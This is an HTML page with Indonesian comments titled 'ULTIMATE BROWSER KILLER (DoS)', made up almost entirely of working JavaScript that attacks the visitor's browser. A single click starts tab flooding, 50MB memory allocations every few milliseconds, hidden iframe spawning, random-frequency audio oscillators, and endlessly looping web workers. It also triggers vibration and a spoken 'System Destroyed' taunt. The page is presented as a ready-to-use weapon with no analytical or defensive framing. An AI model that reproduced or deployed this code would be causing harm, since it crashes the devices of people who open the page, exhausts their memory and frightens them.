<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ULTIMATE BROWSER KILLER (DoS)</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; cursor: pointer; user-select: none; overflow: hidden; }
        .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 500px; width: 100%; border: 1px solid #333; }
        h1 { font-size: 28px; color: #ff0000; margin-bottom: 15px; text-shadow: 0 0 20px #ff0000; animation: pulse 0.5s infinite; }
        p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
        #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
        .warning { background: #330000; color: #ff0000; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; font-weight: bold; border: 2px solid #ff0000; animation: pulse 1s infinite; }
        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
    </style>
</head>

<body>
<div class="panel" id="main-panel">
    <div class="warning">⚠️ KLIK = BROWSER ANDA AKAN HANCUR TOTAL!</div>
    <h1>ULTIMATE BROWSER KILLER</h1>
    <p>Multi-Worker Bombing + Memory Exhaustion + Iframe Flooding + AudioContext Bombing.</p>
    <div id="status" role="status">Menunggu klik...</div>
</div>

<script>
    const statusDiv = document.getElementById("status");
    let isRunning = false;
    let totalTabs = 0;
    let totalWorkers = 0;
    let totalIframes = 0;
    let totalAudio = 0;
    let memoryBomb = [];
    let audioContexts = [];

    // 1. Efek Getar & Suara (Shock Effect)
    function efekHacker() {
        if (navigator.vibrate) {
            navigator.vibrate([2000, 100, 2000, 100, 2000]); // Getar 2 detik
        }
        if ('speechSynthesis' in window) {
            const msg = new SpeechSynthesisUtterance('System Destroyed by Waguri');
            msg.lang = 'en-US';
            msg.rate = 0.5; // Suara lambat & menakutkan
            window.speechSynthesis.speak(msg);
        }
    }

    // 2. Tab Flooding
    function bukaTab() {
        try {
            const win = window.open('about:blank', '_blank');
            if (win) totalTabs++;
        } catch (e) {}
    }

    // 3. Memory Bombing (Alokasi RAM 50MB per tembakan)
    function memoryBombing() {
        try {
            const arr = new Uint8Array(50 * 1024 * 1024); // 50MB
            memoryBomb.push(arr);
        } catch (e) {
            // RAM penuh, browser mulai crash
        }
    }

    // 4. Iframe Flooding (Membuat iframe tak terbatas)
    function buatIframe() {
        try {
            const iframe = document.createElement('iframe');
            iframe.src = 'about:blank';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            totalIframes++;
        } catch (e) {}
    }

    // 5. AudioContext Bombing (Membuat audio server tak terbatas)
    function audioBombing() {
        try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = ctx.createOscillator();
            osc.frequency.value = Math.random() * 20000; // Frekuensi acak
            osc.connect(ctx.destination);
            osc.start();
            audioContexts.push(ctx);
            totalAudio++;
        } catch (e) {}
    }

    // 6. Worker Spawner (Membuat worker tak terbatas)
    function spawnWorker() {
        try {
            const workerCode = `
                self.onmessage = function(e) {
                    if (e.data === 'START') {
                        while(true) {
                            self.postMessage('TAB');
                            self.postMessage('MEMORY');
                            self.postMessage('IFRAME');
                            self.postMessage('AUDIO');
                        }
                    }
                };
            `;
            const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
            const worker = new Worker(URL.createObjectURL(workerBlob));

            worker.onmessage = function(e) {
                // Memicu fungsi di Main Thread
                if (e.data === 'TAB') queueMicrotask(bukaTab);
                if (e.data === 'MEMORY') queueMicrotask(memoryBombing);
                if (e.data === 'IFRAME') queueMicrotask(buatIframe);
                if (e.data === 'AUDIO') queueMicrotask(audioBombing);
            };

            worker.postMessage('START');
            totalWorkers++;
        } catch (e) {}
    }

    // 7. Mulai Serangan
    function mulaiSerangan() {
        if (isRunning) return;
        isRunning = true;
        
        statusDiv.textContent = "MEMULAI TOTAL DESTRUCTION!";
        statusDiv.style.color = "#ff0000";

        efekHacker();

        // Spawn 10 Web Workers awal
        for (let i = 0; i < 10; i++) {
            spawnWorker();
        }

        // Loop Iframe Flooding, Memory, Audio di Main Thread
        setInterval(() => {
            buatIframe();
            memoryBombing();
            audioBombing();
            bukaTab();
            
            statusDiv.textContent = `W:${totalWorkers} | T:${totalTabs} | I:${totalIframes} | A:${totalAudio} | M:${memoryBomb.length * 50}MB`;
        }, 5); // Setiap 5ms

        // Worker Creator Loop (Spawn worker baru setiap 100ms)
        setInterval(spawnWorker, 100);
    }

    // Hanya butuh SATU klik
    document.body.addEventListener('click', mulaiSerangan, { once: true });
</script>
</body>
</html>
